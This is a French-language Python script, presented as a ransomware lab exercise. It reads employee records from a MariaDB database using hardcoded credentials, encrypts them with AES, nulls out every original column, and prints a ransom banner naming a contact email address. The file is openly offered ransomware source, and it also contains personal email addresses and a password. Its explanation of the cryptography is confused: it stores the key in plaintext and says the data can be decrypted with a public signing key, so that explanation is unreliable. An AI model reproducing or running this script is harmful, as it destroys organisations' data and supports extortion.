# ============================================
# LABORATOIRE RANSOMWARE - SCRIPT DE CHIFFREMENT
# ============================================
# Auteur: Naomie
# Description: Ce script simule un ransomware qui chiffre les donnees
# d'une base de donnees MariaDB et genere une signature numerique.
# Utilisation pedagogique uniquement.
# ============================================

import pymysql
import json
import base64
import os
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from datetime import datetime

# ============================================
# CONFIGURATION BASE DE DONNEES
# ============================================
DB_CONFIG = {
    'host': '192.168.200.130',
    'user': 'app_user',
    'password': 'AppPass2026!',
    'database': 'Naomie_entreprise',
    'charset': 'utf8mb4'
}

# ============================================
# 1. CHARGEMENT DES CLES RSA
# ============================================
print("Chargement des cles RSA...")

with open("cle_privee.pem", "rb") as f:
    private_key = serialization.load_pem_private_key(
        f.read(),
        password=None,
        backend=default_backend()
    )
print("Cle privee chargee avec succes.")

with open("cle_publique.pem", "rb") as f:
    public_key = serialization.load_pem_public_key(
        f.read(),
        backend=default_backend()
    )
print("Cle publique chargee avec succes.\n")

print("METHODE UTILISEE (SIGNATURE NUMERIQUE) :")
print("   - La cle PRIVEE signe la cle AES")
print("   - La cle PUBLIQUE verifie la signature")
print("   - L'entreprise peut dechiffrer avec la cle PUBLIQUE\n")

# ============================================
# 2. FONCTIONS CRYPTOGRAPHIQUES
# ============================================
def chiffrer_aes(data, cle_aes):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(cle_aes), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    block_size = 16
    pad_len = block_size - (len(data) % block_size)
    data_padded = data + bytes([pad_len] * pad_len)

    chiffre = encryptor.update(data_padded) + encryptor.finalize()
    return iv + chiffre

def signer_cle_aes_avec_privee(cle_aes, cle_privee):
    return cle_privee.sign(
        cle_aes,
        padding.PKCS1v15(),
        hashes.SHA256()
    )

# ============================================
# 3. CONNEXION A LA BASE DE DONNEES
# ============================================
print("Connexion a la base de donnees...")
try:
    conn = pymysql.connect(**DB_CONFIG)
    cursor = conn.cursor()
    print("Connecte a la base de donnees.\n")
except Exception as e:
    print(f"Erreur de connexion : {e}")
    exit(1)

# ============================================
# 4. RECUPERATION DES DONNEES
# ============================================
print("Recuperation des donnees...")
# CORRECTION: Utiliser le bon nom de colonne avec accent
cursor.execute("SELECT id, nom, prénom, email, poste, salaire, date_embauche, active FROM salariée")
rows = cursor.fetchall()
# CORRECTION: Utiliser le bon nom de colonne avec accent
colonnes = ['id', 'nom', 'prénom', 'email', 'poste', 'salaire', 'date_embauche', 'active']

if not rows:
    print("Aucune donnee trouvee.")
    cursor.close()
    conn.close()
    exit(1)

print(f"{len(rows)} enregistrements recuperes.\n")

data_list = []
for row in rows:
    d = dict(zip(colonnes, row))
    d['salaire'] = str(d['salaire']) if d['salaire'] is not None else None
    d['date_embauche'] = str(d['date_embauche']) if d['date_embauche'] is not None else None
    data_list.append(d)

json_data = json.dumps(data_list, ensure_ascii=False).encode('utf-8')
print(f"Donnees serialisees en JSON ({len(json_data)} octets)")

# ============================================
# 5. CHIFFREMENT ET SIGNATURE
# ============================================
print("Chiffrement et signature des donnees...")

try:
    cle_aes = os.urandom(32)
    print(f"   Cle AES generee : {base64.b64encode(cle_aes).decode()[:20]}...")

    donnees_chiffrees_aes = chiffrer_aes(json_data, cle_aes)
    print(f"   Donnees chiffrees avec AES : {len(donnees_chiffrees_aes)} octets")

    signature = signer_cle_aes_avec_privee(cle_aes, private_key)
    print(f"   Signature avec cle PRIVEE : {len(signature)} octets")
    
    taille_signature = len(signature).to_bytes(4, byteorder='big')
    taille_cle_aes = len(cle_aes).to_bytes(4, byteorder='big')
    
    payload_complet = taille_signature + signature + taille_cle_aes + cle_aes + donnees_chiffrees_aes

    payload_b64 = base64.b64encode(payload_complet).decode('ascii')
    print(f"Donnees chiffrees avec succes ({len(payload_b64)} caracteres)\n")

except Exception as e:
    print(f"Erreur : {e}")
    import traceback
    traceback.print_exc()
    cursor.close()
    conn.close()
    exit(1)

# ============================================
# 6. MISE A JOUR DE LA TABLE
# ============================================
print("Mise a jour de la base de donnees...")

for row in rows:
    id_val = row[0]
    # CORRECTION: Utiliser le bon nom de colonne avec accent
    cursor.execute("""
        UPDATE salariée
        SET donnees_chiffrees = %s,
            nom = NULL,
            prénom = NULL,
            email = NULL,
            poste = NULL,
            salaire = NULL,
            date_embauche = NULL,
            active = NULL
        WHERE id = %s
    """, (payload_b64, id_val))

conn.commit()
print(f"{len(rows)} enregistrements mis a jour.\n")

cursor.close()
conn.close()

# ============================================
# 7. MESSAGE DE RANCON
# ============================================
print("="*80)
print("="*80)
print("=" + " "*78 + "=")
print("=" + " "*20 + "   RANSOMWARE DEPLOYE   " + " "*22 + "=")
print("=" + " "*78 + "=")
print("=" + "="*76 + "=")
print("=" + " "*78 + "=")
print("=" + f"  {len(rows)} enregistrements chiffres" + " "*47 + "=")
print("=" + " "*78 + "=")
print("=" + "  METHODE :" + " "*59 + "=")
print("=" + "     - Cle AES SIGNEE avec la cle PRIVEE" + " "*31 + "=")
print("=" + "     - La victime verifiera avec la cle PUBLIQUE" + " "*27 + "=")
print("=" + "     - La cle privee n'est jamais partagee" + " "*33 + "=")
print("=" + " "*78 + "=")
print("=" + "  PROCHAINES ETAPES :" + " "*49 + "=")
print("=" + "     1. Victime decouvre les donnees chiffrees" + " "*29 + "=")
print("=" + "     2. Victime contacte mpigajesse@gmail.com" + " "*29 + "=")
print("=" + "     3. Vous envoyez la cle PUBLIQUE" + " "*38 + "=")
print("=" + "     4. Victime dechiffre avec la cle PUBLIQUE" + " "*29 + "=")
print("=" + " "*78 + "=")
print("="*80)
print("="*80 + "\n")

print("EN ATTENTE DE L'ACTION DE LA VICTIME...")
print("="*80)
print("Contact : mpigajesse@gmail.com")
print("Attendez que l'entreprise vous contacte...")
print("="*80 + "\n")

# ============================================
# 8. SAUVEGARDE DES INFORMATIONS
# ============================================
with open("ransomware_info.txt", "w") as f:
    f.write(f"STATUT=EN_ATTENTE\n")
    f.write(f"DATE={datetime.now().isoformat()}\n")
    f.write(f"NB_ENREGISTREMENTS={len(rows)}\n")
    f.write(f"EMAIL_VICTIME=naomiemoussavou98@gmail.com\n")
    f.write(f"CLE_PUBLIQUE=cle_publique.pem\n")
    f.write(f"METHODE=Signature PKCS1v15_SHA256\n")

print("Informations sauvegardees dans ransomware_info.txt")
print("\nPOUR ENVOYER LA CLE PUBLIQUE :")
print("   Executez : python3 envoyer_cle.py")
print("="*80 + "\n")
